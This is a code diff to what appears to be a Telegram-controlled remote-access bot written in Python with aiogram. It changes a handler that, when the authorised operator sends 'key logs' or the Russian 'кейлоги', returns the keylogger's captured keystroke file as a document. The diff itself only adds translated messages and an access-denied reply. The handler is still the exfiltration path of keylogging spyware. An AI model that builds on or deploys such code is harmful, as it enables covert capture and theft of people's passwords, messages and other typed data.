@@ -21,15 +21,21 @@ from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from lib.System.Key_logger.key_logger_handlers import log_file_path
 from config import ALLOWED_USER_ID
+from lib.texts import TEXTS, user_languages
 
 def key_logs_handlers(dp):
-    @dp.message(F.text.casefold().startswith("key logs"))
+    @dp.message(F.text.casefold().startswith("key logs") | F.text.casefold().startswith("кейлоги"))
     @dp.message(Command("key_logs"))
     async def send_logs(message: types.Message, state: FSMContext):
-        if message.from_user.id != ALLOWED_USER_ID:
+        user_id = message.from_user.id
+        lang = user_languages.get(user_id, 'ru')
+
+        if user_id != ALLOWED_USER_ID:
+            await message.answer(TEXTS[lang]['no_access'])
             return
+
         if os.path.exists(log_file_path):
-            await message.answer("Отправляю логи, root")
+            await message.answer(TEXTS[lang]['keylogs_sending'])
             await message.answer_document(types.FSInputFile(log_file_path))
         else:
-            await message.answer("Файл логов пока отсутствует, root")
+            await message.answer(TEXTS[lang]['keylogs_missing'])
